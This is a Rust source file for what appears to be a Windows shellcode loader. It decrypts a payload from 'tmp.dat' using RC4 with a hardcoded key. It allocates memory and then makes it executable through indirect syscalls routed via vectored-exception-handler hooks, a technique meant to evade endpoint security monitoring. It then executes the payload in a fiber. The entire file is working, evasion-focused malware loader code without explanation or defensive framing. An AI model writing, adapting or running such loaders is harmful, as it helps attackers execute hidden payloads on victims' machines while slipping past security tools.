use std::mem::transmute;
use std::ptr::{copy, null, null_mut};
use std::fs::File;
use std::io::Read;

use windows_sys::Win32::Foundation::{GetLastError, FALSE};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};
use rust_veh_syscalls::{syscall, get_ssn_by_name, set_hw_bp, debug_println};
use rust_veh_syscalls::hooks::{initialize_hooks, destroy_hooks};

// WinAPI imports for Windows-specific types and constants
use winapi::ctypes::c_void;                // For void types
use winapi::shared::basetsd::{SIZE_T, ULONG_PTR};  // For SIZE_T and ULONG_PTR
use winapi::shared::minwindef::{ULONG};    // For ULONG (used in flags like MEM_COMMIT)
use winapi::shared::ntdef::{HANDLE, NTSTATUS, PVOID};  // Core NT types: HANDLE, NTSTATUS, PVOID

use rc4::{Rc4, KeyInit, StreamCipher};

fn read_file(filename: &str) -> Vec<u8> {
    let mut file = File::open(filename).expect("Failed to open file");
    let mut contents = Vec::new();
    file.read_to_end(&mut contents).expect("Failed to read file");
    contents
}

fn decrypt_rc4(filename: &str) -> Vec<u8> {
    let mut buf = read_file(filename);
    let mut rc4 = Rc4::new(b"DarklabHK".into());
    rc4.apply_keystream(&mut buf);
    buf
}

type OrgNtAllocateVirtualMemory = extern "system" fn(
    HANDLE,       // ProcessHandle
    *mut PVOID,   // BaseAddress (in/out)
    ULONG_PTR,    // ZeroBits
    *mut SIZE_T,  // RegionSize (in/out)
    ULONG,        // AllocationType
    ULONG         // Protect
) -> NTSTATUS;

type OrgNtProtectVirtualMemory = extern "system" fn(
    HANDLE,         // ProcessHandle
    *mut PVOID,     // BaseAddress (in/out)
    *mut SIZE_T,    // RegionSize (in/out)
    ULONG,          // NewProtect
    *mut ULONG      // OldProtect (out)
) -> NTSTATUS;

fn main() { 
    let mut shellcode = decrypt_rc4("tmp.dat");
    let mut shellcode_size = shellcode.len();
    let mut addr: *mut c_void = null_mut();
    initialize_hooks();     
    unsafe {
        let main_fiber = ConvertThreadToFiber(null());
        if main_fiber.is_null() {
            panic!("[-]ConvertThreadToFiber failed: {}!", GetLastError());
        }

        syscall!(
            "NtAllocateVirtualMemory",
            OrgNtAllocateVirtualMemory,
            -1isize as HANDLE,
            &mut addr,
            0,
            &mut shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if addr.is_null() {
            panic!("[-]VirtualAlloc failed: {}!", GetLastError());
        }

        let mut old = PAGE_READWRITE;

        copy(shellcode.as_ptr(), addr.cast(), shellcode_size);

        syscall!(
            "NtProtectVirtualMemory",
            OrgNtProtectVirtualMemory,
            -1isize as HANDLE,
            &mut addr,
            &mut shellcode_size,
            PAGE_EXECUTE,
            &mut old
        );

        let func = transmute(addr);
        let fiber = CreateFiber(0, func, null());
        if fiber.is_null() {
            panic!("[-]CreateFiber failed: {}!", GetLastError());
        }

        SwitchToFiber(fiber);
        destroy_hooks();
    }
}
